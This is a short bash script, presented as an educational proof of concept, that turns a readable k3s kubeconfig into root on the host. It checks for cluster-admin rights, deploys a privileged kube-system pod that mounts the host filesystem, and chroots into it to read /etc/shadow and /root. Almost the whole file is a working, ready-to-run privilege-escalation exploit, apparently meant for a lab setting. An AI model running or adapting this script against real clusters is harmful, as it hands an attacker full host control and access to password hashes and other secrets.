#!/usr/bin/env bash
# k3s readable kubeconfig -> host root (educational PoC)
# Run as the low-privileged user (e.g. student) on the affected host.
# Requires: /etc/rancher/k3s/k3s.yaml readable + kubectl (already at /usr/local/bin/kubectl)
set -u

KCFG="/etc/rancher/k3s/k3s.yaml"
export KUBECONFIG="$KCFG"

echo "[1] Verify the kubeconfig is readable and who we are in the cluster"
ls -l "$KCFG"
kubectl config view --minify -o jsonpath='{.users[0].name}{"\n"}'

echo "[2] Verify we have cluster-admin (expect 'yes')"
kubectl auth can-i '*' '*' --all-namespaces

echo "[3] Node name"
NODE=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}')
echo "node=$NODE"

echo "[4] Deploy a privileged pod that mounts the host root filesystem"
cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostroot
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  restartPolicy: Never
  tolerations:
  - operator: Exists
  containers:
  - name: hostroot
    image: alpine:latest
    command: ["/bin/sh","-c","sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
YAML

echo "[5] Wait for the pod, then chroot into the host filesystem"
kubectl -n kube-system wait --for=condition=Ready pod/hostroot --timeout=180s
kubectl -n kube-system exec -it hostroot -- chroot /host /bin/bash -c 'id; hostname; head -1 /etc/shadow; ls -la /root'

echo "[6] Cleanup (optional, keep it tidy):"
echo "    kubectl -n kube-system delete pod hostroot --force --grace-period=0"
